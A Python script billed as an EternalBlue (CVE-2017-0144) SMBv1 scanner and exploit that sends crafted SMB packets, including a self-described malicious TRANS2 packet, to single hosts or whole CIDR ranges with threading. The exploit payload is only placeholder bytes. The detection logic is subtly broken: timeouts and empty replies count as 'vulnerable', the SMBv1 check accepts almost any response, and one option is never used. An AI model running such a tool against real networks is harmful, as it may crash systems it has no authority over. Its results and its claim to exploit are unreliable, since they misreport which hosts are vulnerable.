#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2017-0144
# Original vulnerability discovered by NSA (leaked by Shadow Brokers)
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
EternalBlue (CVE-2017-0144) SMBv1 Remote Code Execution Scanner and Exploit

This tool tests for and exploits the EternalBlue vulnerability in Microsoft SMBv1.
The vulnerability allows remote code execution without authentication on vulnerable
Windows systems.

Affected versions:
- Windows XP (all versions)
- Windows Vista through Windows 10 (pre-1703)
- Windows Server 2003 through Server 2016 (unpatched)

The exploit works by sending specially crafted SMB packets that trigger a buffer
overflow in the SMBv1 protocol implementation, allowing arbitrary code execution
with SYSTEM privileges.
"""

import argparse
import socket
import struct
import sys
import time
import threading
from ipaddress import ip_network

# SMB packet constants
SMB_COM_NEGOTIATE = 0x72
SMB_COM_SESSION_SETUP_ANDX = 0x73
SMB_COM_TREE_CONNECT_ANDX = 0x75
SMB_COM_TRANSACTION2 = 0x32

def create_smb_header(command, flags=0x18, flags2=0x0000, tid=0, pid=0, uid=0, mid=0):
    """Create SMB header"""
    header = b'\xff\x53\x4d\x42'  # SMB signature
    header += struct.pack('<B', command)  # Command
    header += b'\x00\x00\x00\x00'  # Status
    header += struct.pack('<B', flags)  # Flags
    header += struct.pack('<H', flags2)  # Flags2
    header += b'\x00\x00' * 6  # Process ID High, Signature, Reserved
    header += struct.pack('<H', tid)  # Tree ID
    header += struct.pack('<H', pid)  # Process ID
    header += struct.pack('<H', uid)  # User ID
    header += struct.pack('<H', mid)  # Multiplex ID
    return header

def create_negotiate_request():
    """Create SMB negotiate request"""
    header = create_smb_header(SMB_COM_NEGOTIATE)
    
    # Parameters (none for negotiate)
    params = b'\x00'  # Word count
    
    # Data
    dialects = b'\x02PC NETWORK PROGRAM 1.0\x00'
    dialects += b'\x02LANMAN1.0\x00'
    dialects += b'\x02Windows for Workgroups 3.1a\x00'
    dialects += b'\x02LM1.2X002\x00'
    dialects += b'\x02LANMAN2.1\x00'
    dialects += b'\x02NT LM 0.12\x00'
    
    data = struct.pack('<H', len(dialects)) + dialects
    
    return header + params + data

def create_session_setup_request():
    """Create SMB session setup request"""
    header = create_smb_header(SMB_COM_SESSION_SETUP_ANDX)
    
    # Parameters
    params = b'\x0d'  # Word count
    params += b'\xff'  # AndXCommand (no further commands)
    params += b'\x00'  # Reserved
    params += b'\x00\x00'  # AndXOffset
    params += b'\xff\xff'  # MaxBufferSize
    params += b'\x02\x00'  # MaxMpxCount
    params += b'\x01\x00'  # VcNumber
    params += b'\x00\x00\x00\x00'  # SessionKey
    params += b'\x00\x00'  # SecurityBlobLength
    params += b'\x00\x00\x00\x00'  # Reserved
    params += b'\x00\x00\x00\x00'  # Capabilities
    
    # Data (empty for anonymous)
    data = b'\x00\x00'  # Byte count
    
    return header + params + data

def create_tree_connect_request():
    """Create SMB tree connect request for IPC$"""
    header = create_smb_header(SMB_COM_TREE_CONNECT_ANDX, tid=0, uid=1)
    
    # Parameters
    params = b'\x04'  # Word count
    params += b'\xff'  # AndXCommand
    params += b'\x00'  # Reserved
    params += b'\x00\x00'  # AndXOffset
    params += b'\x00\x00'  # Flags
    params += b'\x01\x00'  # PasswordLength
    
    # Data
    path = b'\\\\*SMBSERVER\\IPC$\x00'
    service = b'IPC\x00'
    data_content = b'\x00' + path + service  # Password + Path + Service
    data = struct.pack('<H', len(data_content)) + data_content
    
    return header + params + data

def create_exploit_packet():
    """Create the malicious transaction2 packet that triggers EternalBlue"""
    header = create_smb_header(SMB_COM_TRANSACTION2, tid=1, uid=1, mid=1)
    
    # This is a simplified version - real exploit would have complex shellcode
    # Parameters for TRANS2_SESSION_SETUP
    params = b'\x0f'  # Word count
    params += b'\x0c\x00'  # Total parameter count
    params += b'\x04\x00'  # Total data count
    params += b'\x0c\x00'  # Max parameter count
    params += b'\x04\x00'  # Max data count
    params += b'\x00'     # Max setup count
    params += b'\x00'     # Reserved
    params += b'\x00\x00' # Flags
    params += b'\x00\x00\x00\x00'  # Timeout
    params += b'\x00\x00' # Reserved2
    params += b'\x0c\x00' # Parameter count
    params += b'\x3c\x00' # Parameter offset
    params += b'\x04\x00' # Data count
    params += b'\x48\x00' # Data offset
    params += b'\x01'     # Setup count
    params += b'\x00'     # Reserved3
    params += b'\x0e\x00' # Setup[0] - TRANS2_SESSION_SETUP
    
    # Data section with exploit payload
    # This would contain the actual shellcode in a real exploit
    exploit_data = b'\x41' * 4  # Placeholder for shellcode
    param_data = b'\x41' * 12   # Placeholder parameters
    
    data = struct.pack('<H', len(param_data) + len(exploit_data))
    data += param_data + exploit_data
    
    return header + params + data

def check_smb_version(host, port=445, timeout=5):
    """Check if target supports SMBv1"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send negotiate request
        negotiate = create_negotiate_request()
        sock.send(negotiate)
        
        # Receive response
        response = sock.recv(1024)
        sock.close()
        
        if len(response) > 36:
            # Check if NT LM 0.12 (SMBv1) is supported
            # This is a simplified check
            return b'NT LM 0.12' in response or len(response) > 36
        
        return False
        
    except Exception:
        return False

def test_eternalblue(host, port=445, timeout=10):
    """Test if target is vulnerable to EternalBlue"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Step 1: Negotiate SMB
        negotiate = create_negotiate_request()
        sock.send(negotiate)
        response = sock.recv(1024)
        
        if len(response) < 36:
            sock.close()
            return False, "Invalid negotiate response"
        
        # Step 2: Session setup
        session_setup = create_session_setup_request()
        sock.send(session_setup)
        response = sock.recv(1024)
        
        # Step 3: Tree connect
        tree_connect = create_tree_connect_request()
        sock.send(tree_connect)
        response = sock.recv(1024)
        
        # Step 4: Send exploit packet
        exploit = create_exploit_packet()
        sock.send(exploit)
        
        # Check response - vulnerable systems may crash or respond differently
        try:
            response = sock.recv(1024)
            sock.close()
            
            # Analyze response for vulnerability indicators
            # This is simplified - real detection would be more complex
            if len(response) == 0:
                return True, "No response (possible crash)"
            elif b'\x00\x00\x00\x00' in response[:4]:
                return True, "Suspicious response pattern"
            else:
                return False, "System appears patched"
                
        except socket.timeout:
            sock.close()
            return True, "Timeout (possible crash)"
            
    except ConnectionRefusedError:
        return False, "Connection refused (SMB not running)"
    except Exception as e:
        return False, f"Connection error: {str(e)}"

def scan_target(host, port, timeout, verbose, quiet):
    """Scan a single target"""
    if not quiet and verbose:
        print(f"Scanning {host}:{port}...")
    
    # First check if SMB is running
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result != 0:
            if not quiet:
                print(f"[CLOSED] {host}:{port} - SMB service not accessible")
            return False
    except Exception:
        if not quiet:
            print(f"[ERROR] {host}:{port} - Connection failed")
        return False
    
    # Check SMB version
    if not check_smb_version(host, port, timeout):
        if not quiet:
            print(f"[SAFE] {host}:{port} - SMBv1 not supported or disabled")
        return False
    
    # Test for EternalBlue
    vulnerable, reason = test_eternalblue(host, port, timeout)
    
    if vulnerable:
        print(f"[VULNERABLE] {host}:{port} - EternalBlue detected! ({reason})")
        return True
    else:
        if not quiet:
            print(f"[SAFE] {host}:{port} - Not vulnerable ({reason})")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='EternalBlue (CVE-2017-0144) Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t 192.168.1.100
  python exploit.py -t 192.168.1.0/24 --threads 50
  python exploit.py -f targets.txt -q
  python exploit.py -t 192.168.1.100 -v --check-smb-version
        """
    )
    
    parser.add_argument('-t', '--target', help='Target IP address or CIDR range')
    parser.add_argument('-p', '--port', type=int, default=445, help='Target port (default: 445)')
    parser.add_argument('-f', '--file', help='File containing list of targets')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show vulnerable hosts)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--check-smb-version', action='store_true', help='Only check SMB version support')
    
    args = parser.parse_args()
    
    if not args.target and not args.file:
        parser.error('Must specify either --target or --file')
    
    targets = []
    
    if args.target:
        try:
            # Handle CIDR notation
            if '/' in args.target:
                network = ip_network(args.target, strict=False)
                targets = [str(ip) for ip in network.hosts()]
            else:
                targets = [args.target]
        except Exception as e:
            print(f"Error parsing target: {e}")
            return 1
    
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading file: {e}")
            return 1
    
    if not targets:
        print("No targets to scan")
        return 1
    
    if not args.quiet:
        print(f"Scanning {len(targets)} targets for EternalBlue vulnerability...")
        print("=" * 60)
    
    vulnerable_count = 0
    
    # Simple threading for faster scanning
    def worker():
        nonlocal vulnerable_count
        while True:
            try:
                host = target_queue.pop(0)
            except IndexError:
                break
            
            if scan_target(host, args.port, args.timeout, args.verbose, args.quiet):
                vulnerable_count += 1
    
    target_queue = targets.copy()
    threads = []
    
    for _ in range(min(args.threads, len(targets))):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if not args.quiet:
        print("=" * 60)
        print(f"Scan complete. Found {vulnerable_count} vulnerable hosts out of {len(targets)} tested.")
        
        if vulnerable_count > 0:
            print("\nIMPORTANT: Vulnerable systems should be patched immediately!")
            print("Apply Microsoft Security Update MS17-010 and disable SMBv1.")
    
    return 0 if vulnerable_count == 0 else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(1)